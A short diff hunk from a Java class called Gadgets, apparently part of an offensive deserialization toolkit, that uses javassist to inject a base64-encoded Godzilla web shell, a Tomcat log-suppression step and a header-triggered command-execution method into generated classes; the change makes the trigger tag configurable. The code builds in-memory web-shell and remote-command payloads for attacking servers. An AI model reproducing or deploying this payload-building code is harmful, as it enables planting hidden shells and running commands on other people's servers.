@@ -433,7 +433,7 @@ public class Gadgets {
 			insertTomcatNoLog(ctClass);
 			insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL));
 		} else if ("execute".equals(type)) {
-			insertField(ctClass, "TAG", "public static String TAG = \"su18\";");
+			insertField(ctClass, "TAG", "public static String TAG = \"" + CMD_HEADER_STRING + "\";");
 			insertCMD(ctClass);
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_REQUEST), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
